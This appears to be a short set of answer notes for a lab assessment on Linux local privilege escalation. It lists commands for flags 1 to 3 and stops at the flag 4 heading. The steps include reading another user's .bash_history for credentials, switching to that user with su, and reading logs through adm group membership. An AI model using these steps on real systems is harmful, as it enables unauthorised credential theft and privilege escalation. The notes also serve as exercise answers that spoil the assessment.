## Linux Local Privilege Escalation - Skills Assessment

**Flag 1
```shell-session
grep -rnw / -e "LLPE" 2>/dev/null
```
OR
```shell-session
ls -la
cd .config
ls -la
cat .flag1.txt
```

**Flag 2
```shell-session
cat /home/barry/.bash_history
```
- Found credentials
```shell-session
su barry
cat flag2.txt
```

**Flag 3
```shell-session
id
```
- In adm group
```shell-session
cat /var/log/flag3.txt
```

**Flag 4
